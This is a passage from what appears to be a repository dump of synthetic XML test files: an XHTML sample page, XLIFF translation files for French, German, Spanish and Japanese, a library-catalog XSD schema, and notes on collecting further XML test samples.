                                Previous: Keyboard Navigation Patterns</a></li>
                        </ul>
                    </nav>
                </section>
            </footer>
        </article>
        
        <aside id="sidebar" role="complementary">
            <section id="about-author">
                <h2>About the Author</h2>
                <img src="author-photo.jpg" alt="Professional headshot of the article author" 
                     width="100" height="100" />
                <p>
                    <strong>Accessibility Expert</strong> has been advocating for inclusive 
                    web design for over 10 years, working with organizations to implement 
                    WCAG guidelines and improve digital accessibility.
                </p>
            </section>
            
            <section id="newsletter-signup">
                <h2>Stay Updated</h2>
                <p>Get the latest accessibility insights delivered to your inbox.</p>
                <form action="newsletter-signup.php" method="post">
                    <label for="email-signup">Email Address:</label>
                    <input type="email" id="email-signup" name="email" required="required" />
                    <button type="submit">Subscribe</button>
                </form>
            </section>
        </aside>
    </main>
    
    <footer role="contentinfo">
        <div class="footer-content">
            <p>© 2024 Inclusive Web Design. All rights reserved.</p>
            <nav aria-label="Footer links">
                <ul>
                    <li><a href="privacy.xhtml">Privacy Policy</a></li>
                    <li><a href="terms.xhtml">Terms of Use</a></li>
                    <li><a href="accessibility-statement.xhtml">Accessibility Statement</a></li>
                </ul>
            </nav>
        </div>
    </footer>
</body>
</html>
</file>

<file path="sample_data/test_files_synthetic/small/xhtml/simple_page.xhtml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="A simple XHTML page for testing XML analysis" />
    <meta name="keywords" content="xhtml, test, xml, web development" />
    <meta name="author" content="Test Developer" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Simple XHTML Test Page</title>
    <link rel="stylesheet" type="text/css" href="styles.css" />
    <link rel="icon" type="image/x-icon" href="favicon.ico" />
</head>
<body>
    <div id="header">
        <h1>Welcome to Our Test Site</h1>
        <nav>
            <ul>
                <li><a href="#home" title="Go to home section">Home</a></li>
                <li><a href="#about" title="Learn about us">About</a></li>
                <li><a href="#contact" title="Contact information">Contact</a></li>
            </ul>
        </nav>
    </div>
    
    <div id="main-content">
        <div id="home">
            <h2>Home Section</h2>
            <p>This is a simple XHTML page designed to test XML parsing capabilities. 
               It contains various HTML elements including headings, paragraphs, lists, 
               and links to demonstrate proper structure analysis.</p>
            
            <img src="test-image.jpg" alt="Test image for accessibility checking" 
                 width="300" height="200" />
        </div>
        
        <div id="about">
            <h2>About This Page</h2>
            <p>This page follows XHTML 1.0 Strict standards and includes:</p>
            <ul>
                <li>Proper DOCTYPE declaration</li>
                <li>Valid XML namespace</li>
                <li>Semantic markup</li>
                <li>Accessibility features</li>
            </ul>
            
            <h3>Technical Details</h3>
            <p>The page demonstrates various aspects of web standards compliance 
               and accessibility best practices.</p>
        </div>
        
        <div id="contact">
            <h2>Contact Information</h2>
            <p>You can reach us through the following methods:</p>
            <ul>
                <li>Email: <a href="mailto:test@example.com">test@example.com</a></li>
                <li>Phone: <a href="tel:+1234567890">+1 (234) 567-890</a></li>
                <li>Website: <a href="https://example.com" 
                              title="Visit our main website">example.com</a></li>
            </ul>
        </div>
    </div>
    
    <div id="footer">
        <p>© 2024 Test Organization. All rights reserved.</p>
        <p><small>This is a test page for XML analysis purposes.</small></p>
    </div>
</body>
</html>
</file>

<file path="sample_data/test_files_synthetic/small/xliff/multilingual_project.xlf">
<?xml version="1.0" encoding="UTF-8"?>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
  <!-- English to French Translation -->
  <file original="product_catalog.xml" source-language="en-US" target-language="fr-FR" datatype="xml" tool-id="trados" date="2024-01-15T14:22:00Z">
    <header>
      <tool tool-id="trados" tool-name="SDL Trados Studio" tool-version="2021" tool-company="SDL"/>
      <phase phase-name="translation" process-name="translate" company-name="Global Translations Inc" tool-id="trados" date="2024-01-15T14:22:00Z"/>
      <phase phase-name="review" process-name="review" company-name="Quality Assurance Ltd" tool-id="reviewer" date="2024-01-16T09:15:00Z"/>
      <note>E-commerce product catalog - French localization</note>
    </header>
    <body>
      <trans-unit id="product_title_1" approved="yes">
        <source>Premium Wireless Headphones</source>
        <target state="final">Casque Sans Fil Premium</target>
        <note from="translator">Marketing term - keep premium feel</note>
        <alt-trans match-quality="85" origin="tm">
          <source>Premium Wireless Headphones</source>
          <target>Écouteurs Sans Fil Premium</target>
        </alt-trans>
      </trans-unit>
      
      <trans-unit id="product_description_1" approved="no">
        <source>Experience superior sound quality with our latest wireless technology. Features active noise cancellation and 30-hour battery life.</source>
        <target state="needs-review-translation">Découvrez une qualité sonore supérieure avec notre dernière technologie sans fil. Doté d'une réduction active du bruit et d'une autonomie de 30 heures.</target>
        <note from="reviewer" priority="medium">Check technical terminology consistency</note>
      </trans-unit>
      
      <trans-unit id="price_label">
        <source>Price:</source>
        <target state="translated">Prix :</target>
      </trans-unit>
      
      <trans-unit id="add_to_cart" approved="yes">
        <source>Add to Cart</source>
        <target state="final">Ajouter au Panier</target>
        <alt-trans match-quality="100" origin="tm">
          <source>Add to Cart</source>
          <target>Ajouter au Panier</target>
        </alt-trans>
      </trans-unit>
      
      <trans-unit id="shipping_info" locked="yes">
        <source>Free shipping on orders over $50</source>
        <target state="translated">Livraison gratuite pour les commandes de plus de 50 $</target>
        <note from="project_manager">Currency format approved - do not change</note>
      </trans-unit>
      
      <trans-unit id="customer_reviews">
        <source>Customer Reviews</source>
        <target state="new"></target>
        <note from="translator">Pending - waiting for terminology approval</note>
      </trans-unit>
      
      <trans-unit id="rating_stars">
        <source>5 out of 5 stars</source>
        <target state="translated">5 étoiles sur 5</target>
      </trans-unit>
      
      <trans-unit id="warranty_info" approved="no">
        <source>2-year manufacturer warranty included</source>
        <target state="needs-review-l10n">Garantie fabricant de 2 ans incluse</target>
        <note from="legal_team">Verify warranty terms for French market</note>
      </trans-unit>
    </body>
  </file>
  
  <!-- English to German Translation -->
  <file original="product_catalog.xml" source-language="en-US" target-language="de-DE" datatype="xml" tool-id="memsource" date="2024-01-15T16:45:00Z">
    <header>
      <tool tool-id="memsource" tool-name="Phrase" tool-version="2024.1" tool-company="Phrase"/>
      <phase phase-name="translation" process-name="translate" company-name="Deutsche Übersetzungen GmbH" tool-id="memsource" date="2024-01-15T16:45:00Z"/>
      <note>E-commerce product catalog - German localization</note>
    </header>
    <body>
      <trans-unit id="product_title_1" approved="yes">
        <source>Premium Wireless Headphones</source>
        <target state="final">Premium Kabellose Kopfhörer</target>
        <note from="translator">German compound word formation</note>
      </trans-unit>
      
      <trans-unit id="product_description_1">
        <source>Experience superior sound quality with our latest wireless technology. Features active noise cancellation and 30-hour battery life.</source>
        <target state="translated">Erleben Sie überlegene Klangqualität mit unserer neuesten kabellosen Technologie. Mit aktiver Geräuschunterdrückung und 30 Stunden Akkulaufzeit.</target>
        <note from="translator">Technical specifications verified</note>
      </trans-unit>
      
      <trans-unit id="price_label">
        <source>Price:</source>
        <target state="translated">Preis:</target>
      </trans-unit>
      
      <trans-unit id="add_to_cart" approved="yes">
        <source>Add to Cart</source>
        <target state="final">In den Warenkorb</target>
        <alt-trans match-quality="95" origin="tm">
          <source>Add to Cart</source>
          <target>Zum Warenkorb hinzufügen</target>
        </alt-trans>
      </trans-unit>
      
      <trans-unit id="shipping_info" locked="yes">
        <source>Free shipping on orders over $50</source>
        <target state="translated">Kostenloser Versand bei Bestellungen über 50 €</target>
        <note from="localization_manager">Currency converted to EUR as per market requirements</note>
      </trans-unit>
      
      <trans-unit id="customer_reviews">
        <source>Customer Reviews</source>
        <target state="translated">Kundenbewertungen</target>
      </trans-unit>
      
      <trans-unit id="rating_stars">
        <source>5 out of 5 stars</source>
        <target state="translated">5 von 5 Sternen</target>
      </trans-unit>
      
      <trans-unit id="warranty_info" approved="yes">
        <source>2-year manufacturer warranty included</source>
        <target state="final">2 Jahre Herstellergarantie inklusive</target>
        <note from="legal_team">Compliant with German warranty regulations</note>
      </trans-unit>
    </body>
  </file>
</xliff>
</file>

<file path="sample_data/test_files_synthetic/small/xliff/simple_translation.xlf">
<?xml version="1.0" encoding="UTF-8"?>
<xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
  <file original="messages.properties" source-language="en-US" target-language="es-ES" datatype="javapropertyresourcebundle" tool-id="msgfmt" date="2024-01-15T10:30:00Z">
    <header>
      <tool tool-id="msgfmt" tool-name="Translation Tool" tool-version="2.1.0" tool-company="Localization Corp"/>
      <note>Basic translation project for web application messages</note>
    </header>
    <body>
      <trans-unit id="welcome_message" approved="yes">
        <source>Welcome to our application!</source>
        <target state="final">¡Bienvenido a nuestra aplicación!</target>
        <note from="translator">Standard greeting message</note>
      </trans-unit>
      
      <trans-unit id="login_button" approved="yes">
        <source>Log In</source>
        <target state="final">Iniciar Sesión</target>
      </trans-unit>
      
      <trans-unit id="logout_button" approved="no">
        <source>Log Out</source>
        <target state="translated">Cerrar Sesión</target>
        <note from="reviewer" priority="high">Consider using "Salir" for consistency</note>
      </trans-unit>
      
      <trans-unit id="save_button">
        <source>Save</source>
        <target state="new"></target>
        <note from="project_manager">High priority - needed for release</note>
      </trans-unit>
      
      <trans-unit id="cancel_button">
        <source>Cancel</source>
        <target state="translated">Cancelar</target>
      </trans-unit>
      
      <trans-unit id="error_message" approved="no">
        <source>An error occurred. Please try again.</source>
        <target state="needs-review-translation">Se produjo un error. Por favor, inténtelo de nuevo.</target>
        <note from="translator">Long message - may need adjustment for UI</note>
        <alt-trans match-quality="95" origin="tm">
          <source>An error occurred. Please try again.</source>
          <target>Ocurrió un error. Inténtelo nuevamente.</target>
        </alt-trans>
      </trans-unit>
      
      <trans-unit id="confirm_dialog">
        <source>Are you sure you want to delete this item?</source>
        <target state="translated">¿Está seguro de que desea eliminar este elemento?</target>
        <note from="linguist">Formal tone appropriate for this context</note>
      </trans-unit>
      
      <trans-unit id="navigation_home">
        <source>Home</source>
        <target state="final">Inicio</target>
        <alt-trans match-quality="100" origin="tm">
          <source>Home</source>
          <target>Inicio</target>
        </alt-trans>
      </trans-unit>
      
      <trans-unit id="navigation_about">
        <source>About</source>
        <target state="translated">Acerca de</target>
      </trans-unit>
      
      <trans-unit id="contact_us" approved="yes">
        <source>Contact Us</source>
        <target state="final">Contáctenos</target>
      </trans-unit>
    </body>
  </file>
</xliff>
</file>

<file path="sample_data/test_files_synthetic/small/xliff/software_ui_translation.xlf">
<?xml version="1.0" encoding="UTF-8"?>
<xliff version="2.1" xmlns="urn:oasis:names:tc:xliff:document:2.1">
  <file id="ui_strings" original="strings.json" source-language="en" target-language="ja">
    <header>
      <tool tool-id="crowdin" tool-name="Crowdin" tool-version="3.0" tool-company="Crowdin"/>
      <note>Software UI localization for Japanese market</note>
    </header>
    <unit id="menu_file" approved="yes">
      <segment>
        <source>File</source>
        <target state="final">ファイル</target>
      </segment>
      <notes>
        <note id="context_note">Main menu item</note>
      </notes>
    </unit>
    
    <unit id="menu_edit" approved="yes">
      <segment>
        <source>Edit</source>
        <target state="final">編集</target>
      </segment>
    </unit>
    
    <unit id="menu_view" approved="no">
      <segment>
        <source>View</source>
        <target state="translated">表示</target>
      </segment>
      <notes>
        <note id="review_note" category="question">Consider using ビュー for software context?</note>
      </notes>
    </unit>
    
    <unit id="toolbar_new" approved="yes">
      <segment>
        <source>New</source>
        <target state="final">新規</target>
      </segment>
    </unit>
    
    <unit id="toolbar_open" approved="yes">
      <segment>
        <source>Open</source>
        <target state="final">開く</target>
      </segment>
    </unit>
    
    <unit id="toolbar_save" approved="no">
      <segment>
        <source>Save</source>
        <target state="needs-review-translation">保存</target>
      </segment>
      <notes>
        <note id="consistency_note">Verify consistency with other save actions</note>
      </notes>
    </unit>
    
    <unit id="dialog_confirm_delete">
      <segment>
        <source>Are you sure you want to delete the selected files? This action cannot be undone.</source>
        <target state="translated">選択されたファイルを削除してもよろしいですか？この操作は元に戻すことができません。</target>
      </segment>
      <notes>
        <note id="ui_note">Confirmation dialog - ensure proper politeness level</note>
      </notes>
    </unit>
    
    <unit id="status_ready">
      <segment>
        <source>Ready</source>
        <target state="final">準備完了</target>
      </segment>
    </unit>
    
    <unit id="status_processing">
      <segment>
        <source>Processing...</source>
        <target state="translated">処理中...</target>
      </segment>
    </unit>
    
    <unit id="error_file_not_found">
      <segment>
        <source>Error: File not found</source>
        <target state="needs-review-translation">エラー: ファイルが見つかりません</target>
      </segment>
      <notes>
        <note id="error_note" category="error">Error message - maintain clarity and politeness</note>
      </notes>
    </unit>
    
    <unit id="settings_general">
      <segment>
        <source>General Settings</source>
        <target state="translated">一般設定</target>
      </segment>
    </unit>
    
    <unit id="settings_language">
      <segment>
        <source>Language</source>
        <target state="final">言語</target>
      </segment>
    </unit>
    
    <unit id="settings_theme">
      <segment>
        <source>Theme</source>
        <target state="new"></target>
      </segment>
      <notes>
        <note id="pending_note">Awaiting terminology decision: テーマ vs 外観</note>
      </notes>
    </unit>
    
    <unit id="help_about" approved="yes">
      <segment>
        <source>About</source>
        <target state="final">バージョン情報</target>
      </segment>
    </unit>
    
    <unit id="help_documentation">
      <segment>
        <source>Documentation</source>
        <target state="translated">ドキュメント</target>
      </segment>
    </unit>
    
    <unit id="keyboard_shortcut_copy">
      <segment>
        <source>Copy (Ctrl+C)</source>
        <target state="translated">コピー (Ctrl+C)</target>
      </segment>
      <notes>
        <note id="shortcut_note">Keep keyboard shortcuts in original format</note>
      </notes>
    </unit>
    
    <unit id="validation_required_field">
      <segment>
        <source>This field is required</source>
        <target state="needs-review-translation">この項目は必須です</target>
      </segment>
      <notes>
        <note id="validation_note">Form validation message</note>
      </notes>
    </unit>
    
    <unit id="progress_complete" approved="yes">
      <segment>
        <source>Complete</source>
        <target state="final">完了</target>
      </segment>
    </unit>
    
    <unit id="button_next">
      <segment>
        <source>Next</source>
        <target state="translated">次へ</target>
      </segment>
    </unit>
    
    <unit id="button_previous">
      <segment>
        <source>Previous</source>
        <target state="translated">前へ</target>
      </segment>
    </unit>
    
    <unit id="button_finish" approved="no">
      <segment>
        <source>Finish</source>
        <target state="translated">完了</target>
      </segment>
      <notes>
        <note id="terminology_note">Same as "Complete" - consider differentiation</note>
      </notes>
    </unit>
  </file>
</xliff>
</file>

<file path="sample_data/test_files_synthetic/small/xsd/library-schema.xsd">
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
           targetNamespace="http://example.com/library/schema"
           xmlns:tns="http://example.com/library/schema"
           xmlns:addr="http://example.com/address/schema"
           elementFormDefault="qualified"
           attributeFormDefault="unqualified"
           version="1.0">

  <xs:annotation>
    <xs:documentation>
      Library Management System XML Schema
      This schema defines the structure for library catalog data,
      including books, authors, borrowers, and lending transactions.
    </xs:documentation>
  </xs:annotation>

  <!-- Import external schema for address types -->
  <xs:import namespace="http://example.com/address/schema" 
             schemaLocation="address-schema.xsd"/>

  <!-- Simple type definitions -->
  <xs:simpleType name="ISBNType">
    <xs:annotation>
      <xs:documentation>ISBN number with format validation</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
      <xs:pattern value="[0-9]{3}-[0-9]{1}-[0-9]{3}-[0-9]{5}-[0-9]{1}"/>
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="BookStatusType">
    <xs:restriction base="xs:string">
      <xs:enumeration value="available"/>
      <xs:enumeration value="checked-out"/>
      <xs:enumeration value="reserved"/>
      <xs:enumeration value="maintenance"/>
      <xs:enumeration value="lost"/>
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="GenreType">
    <xs:restriction base="xs:string">
      <xs:enumeration value="fiction"/>
      <xs:enumeration value="non-fiction"/>
      <xs:enumeration value="science"/>
      <xs:enumeration value="technology"/>
      <xs:enumeration value="history"/>
      <xs:enumeration value="biography"/>
      <xs:enumeration value="children"/>
      <xs:enumeration value="reference"/>
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="MembershipLevelType">
    <xs:restriction base="xs:string">
      <xs:enumeration value="basic"/>
      <xs:enumeration value="premium"/>
      <xs:enumeration value="student"/>
      <xs:enumeration value="faculty"/>
      <xs:enumeration value="staff"/>
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="PositiveDecimalType">
    <xs:restriction base="xs:decimal">
      <xs:minInclusive value="0.01"/>
      <xs:fractionDigits value="2"/>
    </xs:restriction>
  </xs:simpleType>

  <!-- Complex type definitions -->
  <xs:complexType name="PersonType" abstract="true">
    <xs:annotation>
      <xs:documentation>Base type for all person-related entities</xs:documentation>
    </xs:annotation>
    <xs:sequence>
      <xs:element name="firstName" type="xs:string"/>
      <xs:element name="lastName" type="xs:string"/>
      <xs:element name="middleName" type="xs:string" minOccurs="0"/>
      <xs:element name="dateOfBirth" type="xs:date" minOccurs="0"/>
      <xs:element name="email" type="xs:string" minOccurs="0"/>
      <xs:element name="phone" type="xs:string" minOccurs="0"/>
      <xs:element name="address" type="addr:AddressType" minOccurs="0"/>
    </xs:sequence>
    <xs:attribute name="id" type="xs:ID" use="required"/>
  </xs:complexType>

  <xs:complexType name="AuthorType">
    <xs:complexContent>
      <xs:extension base="tns:PersonType">
        <xs:sequence>
          <xs:element name="biography" type="xs:string" minOccurs="0"/>
          <xs:element name="website" type="xs:anyURI" minOccurs="0"/>
          <xs:element name="nationality" type="xs:string" minOccurs="0"/>
          <xs:element name="awards" minOccurs="0">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="award" maxOccurs="unbounded">
                  <xs:complexType>
                    <xs:simpleContent>
                      <xs:extension base="xs:string">
                        <xs:attribute name="year" type="xs:gYear"/>
                      </xs:extension>
                    </xs:simpleContent>
                  </xs:complexType>
                </xs:element>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:sequence>
      </xs:extension>
    </xs:complexContent>
  </xs:complexType>

  <xs:complexType name="BorrowerType">
    <xs:complexContent>
      <xs:extension base="tns:PersonType">
        <xs:sequence>
          <xs:element name="membershipLevel" type="tns:MembershipLevelType"/>
          <xs:element name="membershipExpiry" type="xs:date"/>
          <xs:element name="borrowingHistory" minOccurs="0">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="transaction" type="tns:LendingTransactionType" 
                           minOccurs="0" maxOccurs="unbounded"/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:sequence>
        <xs:attribute name="libraryCardNumber" type="xs:string" use="required"/>
      </xs:extension>
    </xs:complexContent>
  </xs:complexType>

  <xs:complexType name="BookType">
    <xs:sequence>
      <xs:element name="title" type="xs:string"/>
      <xs:element name="subtitle" type="xs:string" minOccurs="0"/>
      <xs:element name="authors">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="author" maxOccurs="unbounded">
              <xs:complexType>
                <xs:choice>
                  <xs:element name="authorRef" type="xs:IDREF"/>
                  <xs:element name="authorInfo" type="tns:AuthorType"/>
                </xs:choice>
                <xs:attribute name="role" type="xs:string" default="author"/>
              </xs:complexType>
            </xs:element>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="isbn" type="tns:ISBNType"/>
      <xs:element name="publisher" type="xs:string"/>
      <xs:element name="publicationDate" type="xs:date"/>
      <xs:element name="edition" type="xs:positiveInteger" default="1"/>
      <xs:element name="pageCount" type="xs:positiveInteger"/>
      <xs:element name="genre" type="tns:GenreType"/>
      <xs:element name="language" type="xs:language" default="en"/>
      <xs:element name="description" type="xs:string" minOccurs="0"/>
      <xs:element name="keywords" minOccurs="0">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="keyword" type="xs:string" maxOccurs="unbounded"/>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="price" type="tns:PositiveDecimalType" minOccurs="0"/>
      <xs:element name="copies" minOccurs="0">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="copy" maxOccurs="unbounded">
              <xs:complexType>
                <xs:sequence>
                  <xs:element name="copyId" type="xs:string"/>
                  <xs:element name="status" type="tns:BookStatusType"/>
                  <xs:element name="location" type="xs:string"/>
                  <xs:element name="condition" type="xs:string" minOccurs="0"/>
                  <xs:element name="notes" type="xs:string" minOccurs="0"/>
                </xs:sequence>
                <xs:attribute name="barcode" type="xs:string"/>
              </xs:complexType>
            </xs:element>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
    </xs:sequence>
    <xs:attribute name="id" type="xs:ID" use="required"/>
    <xs:attribute name="catalogNumber" type="xs:string"/>
  </xs:complexType>

  <xs:complexType name="LendingTransactionType">
    <xs:sequence>
      <xs:element name="bookRef" type="xs:IDREF"/>
      <xs:element name="copyId" type="xs:string"/>
      <xs:element name="borrowerRef" type="xs:IDREF"/>
      <xs:element name="checkoutDate" type="xs:date"/>
      <xs:element name="dueDate" type="xs:date"/>
      <xs:element name="returnDate" type="xs:date" minOccurs="0"/>
      <xs:element name="renewalCount" type="xs:nonNegativeInteger" default="0"/>
      <xs:element name="fines" minOccurs="0">
        <xs:complexType>
          <xs:sequence>
            <xs:element name="fine" maxOccurs="unbounded">
              <xs:complexType>
                <xs:sequence>
                  <xs:element name="amount" type="tns:PositiveDecimalType"/>
                  <xs:element name="reason" type="xs:string"/>
                  <xs:element name="dateAssessed" type="xs:date"/>
                  <xs:element name="datePaid" type="xs:date" minOccurs="0"/>
                </xs:sequence>
              </xs:complexType>
            </xs:element>
          </xs:sequence>
        </xs:complexType>
      </xs:element>
      <xs:element name="notes" type="xs:string" minOccurs="0"/>
    </xs:sequence>
    <xs:attribute name="transactionId" type="xs:ID" use="required"/>
  </xs:complexType>

  <!-- Root element definitions -->
  <xs:element name="library">
    <xs:annotation>
      <xs:documentation>Root element for library catalog data</xs:documentation>
    </xs:annotation>
    <xs:complexType>
      <xs:sequence>
        <xs:element name="metadata">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="libraryName" type="xs:string"/>
              <xs:element name="address" type="addr:AddressType"/>
              <xs:element name="phone" type="xs:string"/>
              <xs:element name="website" type="xs:anyURI" minOccurs="0"/>
              <xs:element name="catalogVersion" type="xs:string"/>
              <xs:element name="lastUpdated" type="xs:dateTime"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
        <xs:element name="authors" minOccurs="0">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="author" type="tns:AuthorType" maxOccurs="unbounded"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
        <xs:element name="books" minOccurs="0">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="book" type="tns:BookType" maxOccurs="unbounded"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
        <xs:element name="borrowers" minOccurs="0">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="borrower" type="tns:BorrowerType" maxOccurs="unbounded"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
        <xs:element name="transactions" minOccurs="0">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="transaction" type="tns:LendingTransactionType" 
                         maxOccurs="unbounded"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
      </xs:sequence>
      <xs:attribute name="schemaVersion" type="xs:string" fixed="1.0"/>
    </xs:complexType>
    
    <!-- Key and keyref constraints for referential integrity -->
    <xs:key name="authorKey">
      <xs:selector xpath="tns:authors/tns:author"/>
      <xs:field xpath="@id"/>
    </xs:key>
    <xs:key name="bookKey">
      <xs:selector xpath="tns:books/tns:book"/>
      <xs:field xpath="@id"/>
    </xs:key>
    <xs:key name="borrowerKey">
      <xs:selector xpath="tns:borrowers/tns:borrower"/>
      <xs:field xpath="@id"/>
    </xs:key>
    <xs:key name="transactionKey">
      <xs:selector xpath="tns:transactions/tns:transaction"/>
      <xs:field xpath="@transactionId"/>
    </xs:key>
    
    <xs:keyref name="authorRef" refer="tns:authorKey">
      <xs:selector xpath="tns:books/tns:book/tns:authors/tns:author/tns:authorRef"/>
      <xs:field xpath="."/>
    </xs:keyref>
    <xs:keyref name="bookRef" refer="tns:bookKey">
      <xs:selector xpath="tns:transactions/tns:transaction/tns:bookRef"/>
      <xs:field xpath="."/>
    </xs:keyref>
    <xs:keyref name="borrowerRef" refer="tns:borrowerKey">
      <xs:selector xpath="tns:transactions/tns:transaction/tns:borrowerRef"/>
      <xs:field xpath="."/>
    </xs:keyref>
  </xs:element>

  <!-- Additional utility elements -->
  <xs:element name="book" type="tns:BookType"/>
  <xs:element name="author" type="tns:AuthorType"/>
  <xs:element name="borrower" type="tns:BorrowerType"/>
  <xs:element name="transaction" type="tns:LendingTransactionType"/>

</xs:schema>
</file>

<file path="sample_data/test_files_synthetic/COLLECTION_SUMMARY.md">
# XML Test Files Collection Summary

This document summarizes the XML test files that have been collected for the XML Analysis Framework.

## Collection Date
July 23, 2025

## Directory Structure

```
test_files/
├── small/          # Files <100KB - Good for unit tests
│   ├── docbook/
│   ├── log4j/
│   ├── pom/
│   ├── rss/
│   ├── sitemap/
│   ├── spring/
│   ├── svg/
│   ├── wsdl/
│   └── xsd/
├── medium/         # Files 100KB-10MB - Good for performance testing (empty)
└── large/          # Files >10MB - Good for stress testing (empty)
```

## Currently Implemented Handlers - Test Files Created ✅

### 1. RSS/Atom Feeds
- **File**: `small/rss/sample-feed.xml`
- **Description**: Comprehensive RSS 2.0 feed with media extensions, multiple items, and proper namespaces
- **Features**: Media thumbnails, author info, categories, GUIDs, proper date formatting

### 2. Maven POM Files
- **File**: `small/pom/spring-boot-example-pom.xml`
- **Description**: Spring Boot Maven project configuration
- **Features**: Parent POM, dependencies, build plugins, Java 17 configuration

### 3. Log4j Configuration
- **File**: `small/log4j/log4j2-example.xml`
- **Description**: Comprehensive Log4j2 configuration
- **Features**: Multiple appenders (Console, File, Rolling), loggers, filters, Sentry integration

### 4. Spring Configuration
- **File**: `small/spring/applicationContext-example.xml`
- **Description**: Full Spring application context with multiple profiles
- **Features**: Database configuration, JPA setup, transaction management, dev/prod profiles

### 5. DocBook Documentation
- **File**: `small/docbook/sample-docbook-guide.xml`
- **Description**: Complete DocBook 5.0 document structure
- **Features**: Book metadata, parts, chapters, sections, examples, tables, cross-references

### 6. SVG Graphics
- **File**: `small/svg/sample-icon.svg`
- **Description**: Rich SVG example with various elements
- **Features**: Gradients, filters, animations, shapes, text, groups, transformations

### 7. XML Sitemaps
- **File**: `small/sitemap/sitemap-example.xml`
- **Description**: Comprehensive XML sitemap with extensions
- **Features**: Image sitemaps, video sitemaps, hreflang tags, proper priorities and change frequencies

## Planned Handlers - Test Files Created 📋

### 8. WSDL (Web Services Description Language)
- **File**: `small/wsdl/hotel-reservation-service.wsdl`
- **Description**: WSDL 2.0 hotel reservation service definition
- **Features**: SOAP binding, complex types, operations, faults, comprehensive service interface

### 9. XSD (XML Schema Definition)
- **File**: `small/xsd/library-schema.xsd`
- **Description**: Complex library management system schema
- **Features**: Complex types, inheritance, constraints, key/keyref, namespaces, imports

## Missing Handlers (Need Test Files)

### Currently Implemented but Missing Files:
1. **SCAP Security Reports** - Need large XML files with security scan results

### Planned Handlers Needing Files:
1. **KML/KMZ (Geographic Data)** - Need GPS/mapping data files
2. **GPX (GPS Exchange)** - Need GPS track files  
3. **Ant/NAnt Build Files** - Need build.xml examples
4. **NuGet Package Specs** - Need .nuspec files
5. **WADL (Web Application Description Language)** - Need REST API descriptions
6. **RelaxNG Schemas** - Need .rng/.rnc files
7. **DITA (Darwin Information Typing Architecture)** - Need technical documentation
8. **TEI (Text Encoding Initiative)** - Need digital humanities markup
9. **HL7 CDA (Clinical Document Architecture)** - Need healthcare documents
10. **XBRL (Business Reporting)** - Need financial reporting documents
11. **PMML (Predictive Models)** - Need machine learning models
12. **XSLT (Transformations)** - Need transformation stylesheets
13. **XSL-FO (Formatting Objects)** - Need print formatting documents

## File Quality Assessment

### Current Files:
- ✅ All files are well-formed XML
- ✅ Use proper namespaces where applicable
- ✅ Include realistic, comprehensive examples
- ✅ Demonstrate various XML features (attributes, elements, CDATA, etc.)
- ✅ Include comments and documentation
- ✅ Follow best practices for each format

### Recommendations for Next Steps:

1. **Find SCAP/STIG files** - Check existing `stigs_old` directory or download from NIST
2. **Expand to medium/large directories** - Add larger, more complex examples
3. **Add edge cases** - Create malformed, unusual encoding, deeply nested examples
4. **Add more format variations** - Different versions, vendor-specific extensions
5. **Add real-world examples** - Collect actual production files (with sensitive data removed)

## Source Attribution

Files were created based on:
- Web search results from GitHub repositories
- Official specifications and documentation
- Common real-world usage patterns
- Best practices for each XML format

All files are synthesized examples designed for testing purposes and do not contain real personal or sensitive data.
</file>

<file path="sample_data/xml-test-files-guide.md">
# XML Test Files Collection Guide

## Overview
This guide lists all XML document types needed for testing the XML Analysis Framework, along with suggested searches to find real-world examples.

## ✅ Currently Implemented Handlers

### 1. SCAP Security Reports
**File Types**: `.xml` (usually large, 10-100MB)
**Search Queries**:
- `"asset-report-collection" filetype:xml site:github.com`
- `SCAP XCCDF benchmark filetype:xml`
- `"scap.nist.gov/schema" filetype:xml`
- `STIG SCAP results filetype:xml`

**Good Sources**:
- NIST National Checklist Program Repository
- DoD Cyber Exchange (public STIG benchmarks)
- GitHub repos with "scap" or "openscap" topics

### 2. RSS/Atom Feeds
**File Types**: `.xml`, `.rss`, `.atom`
**Search Queries**:
- `"rss version=" filetype:xml -site:w3.org`
- `atom feed example filetype:xml`
- `podcast RSS feed filetype:xml`
- `news RSS feed example github`

**Good Sources**:
- Major news sites (append `/rss` to URLs)
- Podcast platforms
- Blog platforms (WordPress, Medium exports)

### 3. Maven POM Files
**File Types**: `pom.xml`
**Search Queries**:
- `pom.xml site:github.com`
- `"modelVersion>4.0.0" filetype:xml`
- `maven project pom.xml example`
- `spring boot pom.xml site:github.com`

**Good Sources**:
- Any Java project on GitHub
